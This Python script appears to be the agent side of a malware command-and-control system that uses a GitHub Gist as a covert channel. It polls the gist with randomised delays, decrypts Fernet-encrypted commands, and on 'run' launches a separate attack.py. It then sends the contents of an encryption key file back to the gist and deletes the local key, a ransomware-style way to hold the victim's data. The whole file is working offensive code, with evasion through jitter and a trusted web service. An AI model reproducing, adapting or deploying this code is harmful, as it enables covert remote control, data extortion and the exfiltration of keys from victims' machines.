import requests , time , random , subprocess , sys, os
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from attack import delete_key

load_dotenv()

TOKEN = os.environ["GITHUB_TOKEN"]
GIST_ID = "7ab519d3252a1e4f1ed713fff9f3987f"
FILENAME = "channel.txt"

def load_key(file_path="conv.key"):
    with open(file_path, 'r', encoding='utf-8') as file:
        return file.read()

SECRET_KEY = load_key()


cipher = Fernet(SECRET_KEY.encode())

def get_headers():
    return {"Authorization": f"token {TOKEN}", "Accept": "application/vnd.github.v3+json"}

def read_channel():
    url = f"https://api.github.com/gists/{GIST_ID}"
    try:
        r = requests.get(url, headers=get_headers(), timeout=15)
        if r.status_code == 200:
            return r.json()["files"][FILENAME]["content"].strip()
        return None
    except requests.RequestException:
        return None

def write_channel(text):
    url = f"https://api.github.com/gists/{GIST_ID}"
    data = {"files": {FILENAME: {"content": text}}}
    try:
        r = requests.patch(url, headers=get_headers(), json=data, timeout=15)
        return r.status_code == 200
    except requests.RequestException:
        return False

def main():
    print("[B] Listening for encrypted commands...")

    while True:
        content = read_channel()
        
        if content and content.startswith("B:"):
            encrypted_msg = content[2:].strip()
            
            try:
                decrypted_bytes = cipher.decrypt(encrypted_msg.encode())
                message = decrypted_bytes.decode('utf-8')
                print(f"\n[B] 🔓 Decrypted command: {message}")
                
                if message.strip() == "run":
                    print("[B] Command 'run' recognized. Executing...")

                    subprocess.run([sys.executable, 'attack.py'], capture_output=False, text=True, check=True)
    
                    
                    
                    reply_plaintext = load_key("enc.key")
                    
                    encrypted_reply = cipher.encrypt(reply_plaintext.encode()).decode('utf-8')
                    delete_key()
                    
                    time.sleep(random.uniform(1.0, 4.0))
                    
                    if write_channel(f"A:{encrypted_reply}"):
                        print(f"[B] Encrypted reply sent. (Plaintext: {reply_plaintext})")
                    else:
                        print("[B] Failed to send reply.")
                        
                    cooldown = random.randint(10, 30)
                    print(f"[B] Task complete. Cooling down for {cooldown}s...\n")
                    time.sleep(cooldown)
                
                else:
                    print("[B] Message ignored. Command was not 'run'.")
                    write_channel("__EMPTY__")
                
                break 
                
            except Exception as e:
                print(f"[B] Decryption failed (Tampered or wrong key): {e}")
                break
        
        base_delay = 90
        jitter = random.randint(-45, 45)
        delay = base_delay + jitter
        time.sleep(delay)

if __name__ == "__main__":
    main()